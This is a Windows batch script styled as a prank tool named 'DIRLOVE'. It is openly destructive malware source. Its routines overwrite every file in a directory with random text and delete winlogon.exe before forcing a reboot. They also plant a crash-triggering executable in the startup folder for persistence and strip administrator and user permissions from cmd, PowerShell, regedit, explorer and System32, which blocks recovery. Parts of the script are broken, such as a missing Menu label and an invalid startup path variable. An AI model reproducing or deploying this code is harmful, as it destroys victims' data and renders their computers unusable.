@echo off
goto Menu
set"IlIIIIllIlIl=***********************************"
set"lIIlIllIIllI=*                                 *"
set"IIllIIllIIll=*          DIRLOVE <3             *"
set"IIIIIlIlllIl=Credits_Reference"
set"IlllIllIIllI=BlueScreenOfDeath"

:FileContentChangerForDirectory
if not exist %~1 (
    echo The path does not exist.
    pause
    goto Menu
    exit /b 1
) else (
    :: List directory contents and output names in Batch script
    for %%f in (%~1\*) do (
        echo %%~nxf > files_in_dir.txt
    )
    :: Read the file and output the contents
    for /f "tokens=*" %%a in (files_in_dir.txt) do (
        call :FileContentChanger %~1\%%a
    )
    del /q files_in_dir.txt
)
exit /b 0
::****************************************
::Check for valid path
:ValidPathCheck
if not exist %~1 (
    echo The path does not exist.
    pause
    goto Menu
    exit /b 1
)
exit /b 0
::****************************************
::File content changer
:FileContentChanger
call :ValidPathCheck %~1
if %errorLevel% neq 0 (
    exit /b 1
) else (
    cls
    call :CreateGibberish
    echo %gibberish% > %~1
)
::****************************************
::Gibberish creation
:CreateGibberish
setlocal enabledelayedexpansion
set "g=ABCDEFGHIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "gibberish="
for /l %%i in (1,1,100) do (
    set /a "rand=(%random%*62)/32768+1"
    for /l %%j in (!rand!,1,!rand!) do (
        for %%k in (!rand!) do set "gibberish=!gibberish!!g:~%%k,1!"
    )
)
echo %gibberish% > %~dp0\gibberish.txt
setlocal disabledelayedexpansion
exit /b 0
:PrankMsgBox
cls
call :CreateGibberish
if not exist %~dp0\msgbox.vbs (
    echo do >> %~dp0\msgbox.vbs
    echo msgbox "%gibberish%", vbOKOnly, "HACKED" >> %~dp0\msgbox.vbs
    echo Loop >> %~dp0\msgbox.vbs
)

start %~dp0\msgbox.vbs
exit /b 0

:BSOD_menu_option
cls
echo.
call :Credits_Reference
echo 1. Trigger BSOD (Administrators only)
echo 2. Trigger BSOD (Non-Administrators)
echo 3. Exit
set /p "choice=Enter your choice: "
if %choice%==1 goto BSOD_With_Admin
if %choice%==2 goto BSOD_NonAdmin
if %choice%==3 goto Menu

net session >nul 2>&1
if %errorLevel% neq 0 (
    call :BSOD_With_Admin
) else (
    call :PathBSOD
)
exit /b 0
:BSOD_With_Admin
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo This is Administrators-only, which is not detected in this session. (Run this script as Administrators)
    pause
    goto Menu
)
else (
    takeown /f C:\Windows\System32\winlogon.exe
    icacls C:\Windows\System32\winlogon.exe /grant %username%:F
    del C:\Windows\System32\winlogon.exe
    shutdown /r /t 0
)
exit /b 0
:ConvertBatToExe
set "batfile=%~1"
set "batname=%~n1"
set "batpath=%~dp1"
set "exefile=%batpath%%batname%.exe"

set "sedfile=%batpath%%batname%.sed"


(
echo [Version]
echo Class=IEXPRESS
echo [Options]
echo PackagePurpose=InstallApp
echo ShowInstallProgramWindow=1
echo HideExtractAnimation=1
echo UseLongFileName=1
echo InsideCompressed=0
echo CAB_FixedSize=0
echo CAB_ResvCodeSigning=0
echo RebootMode=N
echo InstallPrompt=
echo DisplayLicense=
echo FinishMessage=
echo TargetName=%exefile%
echo FriendlyName=%batname%
echo AppLaunched=%batname%.bat
echo PostInstallCmd=<None>
echo AdminQuietInstCmd=
echo UserQuietInstCmd=
echo SourceFiles=SourceFiles
echo [SourceFiles]
echo SourceFiles0=%batpath%
echo [SourceFiles0]
echo %batname%.bat=
) > "%sedfile%"


iexpress /N /Q "%sedfile%"
del "%sedfile%"
exit /b 0

:BSOD_NonAdmin
set BSOD_Trigger_Path="\\.\GLOBALROOT\Device\ConDrv\KernelConnect\"
echo %BSOD_Trigger_Path% >> %~dp0\BSOD_Trigger_Path.bat
call :ConvertBatToExe %~dp0\BSOD_Trigger_Path.bat

copy %~dp0\BSOD_Trigger_Path.exe %shell:startup%
call :SafeLock

shutdown /r /t 0
exit /b 0

:SafeLock
call :LockProtect "C:\Windows\regedit.exe"
call :LockProtect "C:\Windows\System32\cmd.exe"
call :LockProtect "C:\Windows\SysWOW64\cmd.exe"
call :LockProtect "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
call :LockProtect "C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe"
call :LockProtect "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
call :LockProtect "C:\Windows\SysWOW64\explorer.exe"
call :LockProtect "C:\Windows\explorer.exe"

call :LockProtect "C:\Windows\System32"
call :LockProtect "C:\Windows\SysWOW64"

call :LockProtect %~dp0
exit /b 0

:GetRealName

for /f "tokens=3 delims=\" %%s in ('echo %userprofile%') do (
	set realName=%%s
)
exit /b 0

:LockProtect

icacls "%~1" /reset /t
icacls "%~1" /inheritance:d /t
icacls "%~1" /remove "Administrators" /t
icacls "%~1" /remove "%username%" /t
icacls "%~1" /remove "Authenticated Users" /t
icacls "%~1" /grant "Users:RX" /t
icacls "%~1" /inheritance:d /t
exit /b 0
:mainloop
call :SafeLock